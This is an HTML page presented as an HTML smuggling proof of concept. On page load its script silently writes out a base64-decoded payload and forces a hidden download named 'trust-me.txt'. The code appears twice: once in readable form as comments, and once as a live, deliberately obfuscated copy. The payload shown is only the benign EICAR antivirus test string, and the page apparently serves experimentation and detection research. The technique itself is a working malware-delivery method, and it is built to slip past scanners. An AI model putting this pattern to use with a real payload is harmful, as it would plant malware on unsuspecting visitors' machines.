<html>
    <head>
        <title>Html Smuggling proof of concept</title>
    </head>
    <body>
        <div class="intro">Just a page to experiment with html smuggling</div>

        <script type="text/javascript">
            // ---- BEGIN ORIGINAL CODE ----
            // const base64ToArrayBuffer = (base64) => {
            //     const binaryString = window.atob(base64);
            //     const length = binaryString.length;
            //     const bytes = new Uint8Array(length);
            //     for (let i = 0; i < length; i++) bytes[i] = binaryString.charCodeAt(i);
            //     return bytes.buffer;
            // }
            //
            // // Just the EICAR test file :)
            // const payload = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
            // const base64EncodedPayload = window.btoa(payload);
            // const data = base64ToArrayBuffer(base64EncodedPayload);
            // const blob = new Blob([data], { type: 'octet/stream' });
            // const url = URL.createObjectURL(blob);
            // const a = document.createElement('a');
            // document.body.appendChild(a);
            //
            // a.style.display = 'none';
            // a.href = url;
            // a.download = 'trust-me.txt'; // This actually executes a direct download...
            // a.click(); // Execute running the payload
            //
            // URL.revokeObjectURL(url);
            // ---- END ORIGINAL CODE ----

            // ---- BEGIN OBFUSCATED CODE ----
            const _0x4a223f=_0x4579;function _0x308a(){const _0x79e44e=['createElement','display','5637408ZeKWNX','revokeObjectURL','charCodeAt','1613433QAUmkm','appendChild','btoa','download','6231357cyKFHP','6906662mWHUWF','257102KPCzSH','click','8uJmVVI','buffer','style','6EjLGDt','trust-me.txt','10kgvXKA','none','1186135BKUrJt','length','X5O!P%@AP[4\x5cPZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*','body','octet/stream','33828927qhHsVv','6zIbubW','atob','createObjectURL'];_0x308a=function(){return _0x79e44e;};return _0x308a();}function _0x4579(_0x51cb7c,_0x124939){const _0x308a67=_0x308a();return _0x4579=function(_0x4579c8,_0x42f42e){_0x4579c8=_0x4579c8-0x12d;let _0xb730bf=_0x308a67[_0x4579c8];return _0xb730bf;},_0x4579(_0x51cb7c,_0x124939);}(function(_0x49a341,_0x3c2ca4){const _0x1f41e4=_0x4579,_0x17fafe=_0x49a341();while(!![]){try{const _0x7af8d1=parseInt(_0x1f41e4(0x13f))/0x1*(parseInt(_0x1f41e4(0x144))/0x2)+-parseInt(_0x1f41e4(0x139))/0x3*(parseInt(_0x1f41e4(0x141))/0x4)+parseInt(_0x1f41e4(0x148))/0x5*(parseInt(_0x1f41e4(0x131))/0x6)+-parseInt(_0x1f41e4(0x13e))/0x7+-parseInt(_0x1f41e4(0x136))/0x8+-parseInt(_0x1f41e4(0x13d))/0x9+-parseInt(_0x1f41e4(0x146))/0xa*(-parseInt(_0x1f41e4(0x130))/0xb);if(_0x7af8d1===_0x3c2ca4)break;else _0x17fafe['push'](_0x17fafe['shift']());}catch(_0x4a782a){_0x17fafe['push'](_0x17fafe['shift']());}}}(_0x308a,0x987a9));const base64ToArrayBuffer=_0x5a3306=>{const _0x1f6295=_0x4579,_0x2002ee=window[_0x1f6295(0x132)](_0x5a3306),_0x40213e=_0x2002ee[_0x1f6295(0x149)],_0x1ec3ac=new Uint8Array(_0x40213e);for(let _0x2b0a19=0x0;_0x2b0a19<_0x40213e;_0x2b0a19++)_0x1ec3ac[_0x2b0a19]=_0x2002ee[_0x1f6295(0x138)](_0x2b0a19);return _0x1ec3ac[_0x1f6295(0x142)];},payload=_0x4a223f(0x12d),base64EncodedPayload=window[_0x4a223f(0x13b)](payload),data=base64ToArrayBuffer(base64EncodedPayload),blob=new Blob([data],{'type':_0x4a223f(0x12f)}),url=URL[_0x4a223f(0x133)](blob),a=document[_0x4a223f(0x134)]('a');document[_0x4a223f(0x12e)][_0x4a223f(0x13a)](a),a[_0x4a223f(0x143)][_0x4a223f(0x135)]=_0x4a223f(0x147),a['href']=url,a[_0x4a223f(0x13c)]=_0x4a223f(0x145),a[_0x4a223f(0x140)](),URL[_0x4a223f(0x137)](url);
            // ---- END OBFUSCATED CODE ----
        </script>
    </body>
</html>
